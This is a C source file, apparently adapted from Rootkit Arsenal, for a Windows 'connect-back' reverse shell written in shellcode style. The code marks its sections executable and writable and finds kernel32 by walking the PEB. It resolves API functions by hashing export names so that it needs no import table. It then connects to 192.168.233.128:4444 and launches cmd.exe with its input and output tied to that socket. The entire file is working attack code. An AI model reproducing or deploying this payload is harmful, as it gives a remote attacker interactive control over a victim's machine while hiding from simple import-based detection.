// ConnectBack.c : Defines the entry point for the console application.
// Based on Rootkit Arsenal (the reverend)


#include <stdio.h>
#include <Windows.h>
//#include <WinSock2.h>

#pragma section(".code", execute,read,write)
#pragma comment(linker,"/MERGE:.text=.code")
#pragma comment(linker,"/MERGE:.data=.code")
#pragma comment(linker,"/SECTION:.code,ERW")
#pragma code_seg(".code")

#define SZ_FORMAT_STR 4
#define SZ_RESOLVE_NAME 32


#define VAR_DWORD(name) __asm __emit 0x00 __asm __emit 0x00 __asm __emit 0x00 __asm __emit 0x00
#define STR_DEF_04(name, a1, a2, a3, a4) __asm __emit a1 __asm __emit a2 __asm __emit a3 __asm __emit a4

#define HTONS(A) ((((short)(A) & 0xff00) >> 8) | \
(((short)(A) & 0x00ff) << 8))

#define HTONL(A) ((((int)(A) & 0xff000000) >> 24) | \
(((int)(A) & 0x00ff0000) >> 8) | \
(((int)(A) & 0x0000ff00) << 8) | \
(((int)(A) & 0x000000ff) << 24))

#define Naked __declspec( naked )

typedef void * (WINAPI *_LoadLibraryA)(char *);
typedef void * (WINAPI *_GetProcAddress)(void *, char *);
typedef void (WINAPI *_ExitProcess)(unsigned int);
typedef int (WINAPI *_CreateProcessA)(void *, void *, void *, void *, int, unsigned long, void *, void *, void *, void *);
typedef int (WINAPI *_WSAStartup)(unsigned short, void *);
typedef unsigned int (WINAPI *_WSASocketA)(int, int, int, void *, unsigned int, int);
typedef int (WINAPI *_connect)(int, void *, int);
typedef unsigned long (WINAPI *_inet_addr)(char *);

#pragma pack(1)
typedef struct _FUNCTION {
	unsigned char name[SZ_RESOLVE_NAME];
	void *address;
} FUNCTION;
#pragma pack()

#pragma pack(1)
typedef struct _sockaddr_in {
    short            sin_family;   
    unsigned short   sin_port;    
    unsigned long	addr;
    char             sin_zero[8]; 
} sockaddr_in;
#pragma pack()

#pragma pack(1)
typedef struct _ADDRESS_TABLE
{	
	void *kernel32base;
	FUNCTION LoadLibraryA;
	FUNCTION GetProcAddress;
	FUNCTION ExitProcess;
	FUNCTION CreateProcessA;

	void *ws2_32base;
	FUNCTION WSAStartup;
	FUNCTION WSASocketA;
	FUNCTION connect;
	FUNCTION inet_addr;

	sockaddr_in hax;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;

} ADDRESS_TABLE;
#pragma pack()




Naked unsigned long AddressTable(void) {
	__asm {
		call end;

		//Kernel32.dll
		VAR_DWORD(Kernel32Base);
		
		STR_DEF_04(LoadLibraryA, 'L','o','a','d');
		STR_DEF_04(LoadLibraryA, 'L','i','b','r');
		STR_DEF_04(LoadLibraryA, 'a','r','y','A');
		STR_DEF_04(LoadLibraryA, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(LoadLibraryA, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(LoadLibraryA, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(LoadLibraryA, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(LoadLibraryA, 0x00, 0x00, 0x00, 0x00);
		VAR_DWORD(LoadLibraryA);

		STR_DEF_04(GetProcAddress, 'G','e','t','P');
		STR_DEF_04(GetProcAddress, 'r','o','c','A');
		STR_DEF_04(GetProcAddress, 'd','d','r','e');
		STR_DEF_04(GetProcAddress, 's','s', 0x00, 0x00);
		STR_DEF_04(GetProcAddress, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(GetProcAddress, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(GetProcAddress, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(GetProcAddress, 0x00, 0x00, 0x00, 0x00);
		VAR_DWORD(GetProcAddress);

		STR_DEF_04(ExitProcess, 'E','x','i','t');
		STR_DEF_04(ExitProcess, 'P','r','o','c');
		STR_DEF_04(ExitProcess, 'e','s','s', 0x00);
		STR_DEF_04(ExitProcess, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(ExitProcess, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(ExitProcess, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(ExitProcess, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(ExitProcess, 0x00, 0x00, 0x00, 0x00);
		VAR_DWORD(ExitProcess);

		STR_DEF_04(CreateProcessA, 'C','r','e','a');
		STR_DEF_04(CreateProcessA, 't','e','P','r');
		STR_DEF_04(CreateProcessA, 'o','c','e', 's');
		STR_DEF_04(CreateProcessA, 's', 'A', 0x00, 0x00);
		STR_DEF_04(CreateProcessA, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(CreateProcessA, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(CreateProcessA, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(CreateProcessA, 0x00, 0x00, 0x00, 0x00);
		VAR_DWORD(CreateProcessA);

		//WS2_32.dll
		VAR_DWORD(WS2_32Base);
		
		STR_DEF_04(WSAStartup, 'W','S','A','S');
		STR_DEF_04(WSAStartup, 't','a','r','t');
		STR_DEF_04(WSAStartup, 'u','p', 0x00, 0x00);
		STR_DEF_04(WSAStartup, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(WSAStartup, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(WSAStartup, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(WSAStartup, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(WSAStartup, 0x00, 0x00, 0x00, 0x00);
		VAR_DWORD(WSAStartup);

		STR_DEF_04(WSASocketA, 'W','S','A','S');
		STR_DEF_04(WSASocketA, 'o','c','k','e');
		STR_DEF_04(WSASocketA, 't','A', 0x00, 0x00);
		STR_DEF_04(WSASocketA, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(WSASocketA, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(WSASocketA, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(WSASocketA, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(WSASocketA, 0x00, 0x00, 0x00, 0x00);
		VAR_DWORD(WSASocketA);

		STR_DEF_04(connect, 'c','o','n','n');
		STR_DEF_04(connect, 'e','c','t', 0x00);
		STR_DEF_04(connect, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(connect, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(connect, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(connect, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(connect, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(connect, 0x00, 0x00, 0x00, 0x00);
		VAR_DWORD(connect);

		STR_DEF_04(inet_addr, 'i','n','e','t');
		STR_DEF_04(inet_addr, '_','a','d', 'd');
		STR_DEF_04(inet_addr, 'r', 0x00, 0x00, 0x00);
		STR_DEF_04(inet_addr, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(inet_addr, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(inet_addr, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(inet_addr, 0x00, 0x00, 0x00, 0x00);
		STR_DEF_04(inet_addr, 0x00, 0x00, 0x00, 0x00);
		VAR_DWORD(inet_addr);


		VAR_DWORD(sockaddr_in);
		VAR_DWORD(sockaddr_in);
		VAR_DWORD(sockaddr_in);
		VAR_DWORD(sockaddr_in);


		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);
		VAR_DWORD(STARTUPINFO);


		VAR_DWORD(PROCESS_INFORMATION);
		VAR_DWORD(PROCESS_INFORMATION);
		VAR_DWORD(PROCESS_INFORMATION);
		VAR_DWORD(PROCESS_INFORMATION);

	end:
		pop eax;
		ret;
	}
}


Naked unsigned long getKernel32Base(void) {
	__asm {
		push esi;
		xor eax, eax;
		mov eax, dword ptr fs:[eax + 0x30];
		mov eax, dword ptr ds:[eax + 0x0c];
		mov esi, dword ptr ds:[eax + 0x0c]; // in load order -> second entry
		lodsd;
		xor ebx, ebx;
		mov eax, dword ptr ds:[eax + ebx];
		mov eax, dword ptr ds:[eax + 0x18];
		pop esi;
		ret;
	}
}


unsigned long getHash(unsigned char *value) {	
	unsigned long hash = 0;
    for(; *value; ++value)
    {
    	hash += *value;
    	hash += (hash << 10);
    	hash ^= (hash >> 6);
    }
    hash += (hash << 3);
    hash ^= (hash >> 11);
    hash += (hash << 15);

    return hash;
}

void * resolve_function(void *dllbase, int hash_value) {
	PIMAGE_NT_HEADERS peHeader;
	IMAGE_OPTIONAL_HEADER32 optionalHeader;
	IMAGE_DATA_DIRECTORY dataDirectory;
	DWORD descriptorStartRVA;
	PIMAGE_EXPORT_DIRECTORY exportDirectory;	
	DWORD *routineNames;
	WORD *ordinals;
	DWORD *rvas;	
	int index;
	DWORD name;
	void *function_address = NULL;

	peHeader = (PIMAGE_NT_HEADERS)((unsigned long)dllbase + ((PIMAGE_DOS_HEADER)(dllbase))->e_lfanew);
	optionalHeader = peHeader->OptionalHeader;
	dataDirectory = optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	exportDirectory = (PIMAGE_EXPORT_DIRECTORY)( (unsigned long) dllbase + dataDirectory.VirtualAddress);
	//printf("%s\n",  (unsigned long) dllbase + exportDirectory->Name);
	routineNames = (DWORD *)(exportDirectory->AddressOfNames + (unsigned long) dllbase);
	rvas = (DWORD *)(exportDirectory->AddressOfFunctions + (unsigned long) dllbase);
	ordinals = (WORD *)(exportDirectory->AddressOfNameOrdinals + (unsigned long) dllbase);

	for(index=0; index<exportDirectory->NumberOfFunctions; index++) {

		name = routineNames[index] + (unsigned long) dllbase;		
		if (getHash((unsigned char *)name) == hash_value) {			
			//printf("%s %08x\n", name, ordinals[index]); 					
			function_address = (void *) (rvas[ordinals[index]] + (unsigned long) dllbase);
			break;
		}			
	}
	return function_address;	
}

void main(int argc, char* argv[])
{
	char wsaData[0x190];		
	unsigned int socket; 
	ADDRESS_TABLE *table = (ADDRESS_TABLE *)AddressTable();
	table->kernel32base = (void *)getKernel32Base();

	// Resolve LoadLibraryA and GetProcAddress
	table->LoadLibraryA.address = resolve_function(table->kernel32base, getHash(table->LoadLibraryA.name));
	table->GetProcAddress.address = resolve_function(table->kernel32base, getHash(table->GetProcAddress.name));

	//Load and Save ws2_32.dll base
	table->ws2_32base = ((_LoadLibraryA)(table->LoadLibraryA.address))("ws2_32.dll");
	
	// Resolve required functions to revese_shell
	table->ExitProcess.address = resolve_function(table->kernel32base, getHash(table->ExitProcess.name));
	table->CreateProcessA.address = resolve_function(table->kernel32base, getHash(table->CreateProcessA.name));
	
	table->WSAStartup.address = resolve_function(table->ws2_32base, getHash(table->WSAStartup.name));
	//printf("__DEBUG: %08x    ---  %08x", table->WSAStartup.address, GetProcAddress(LoadLibraryA("ws2_32.dll"), "WSAStartup"));
	table->WSASocketA.address = resolve_function(table->ws2_32base, getHash(table->WSASocketA.name));
	table->connect.address = resolve_function(table->ws2_32base, getHash(table->connect.name));
	table->inet_addr.address = resolve_function(table->ws2_32base, getHash(table->inet_addr.name));

	//Do the trade	
	((_WSAStartup)table->WSAStartup.address)(0x0202, &wsaData);
	socket = ((_WSASocketA)table->WSASocketA.address)(2, 1, 0, 0, 0, 0);
	table->hax.sin_family = 0x2;
	table->hax.sin_port = HTONS(4444);
	table->hax.addr = ((_inet_addr)table->inet_addr.address)("192.168.233.128");
	((_connect)table->connect.address)(socket,(void *)&(table->hax), 0x10);

	table->startupInfo.cb = 0x44;
	table->startupInfo.dwFlags = 0x00000100; //STARTF_USESTDHANDLES
	table->startupInfo.hStdInput = (HANDLE)socket;
	table->startupInfo.hStdOutput = (HANDLE)socket;
	table->startupInfo.hStdError = (HANDLE)socket;
	printf("%08x", ((_CreateProcessA)table->CreateProcessA.address)(NULL, "cmd.exe", NULL, NULL, 1, 0x8000000, NULL, NULL, &(table->startupInfo), &(table->processInformation)) );
	
	
	((_ExitProcess)table->ExitProcess.address)(0);
	
	STR_DEF_04(marker, 'E','N','D','_');	
	STR_DEF_04(marker, 'C','O','D','E');	
}

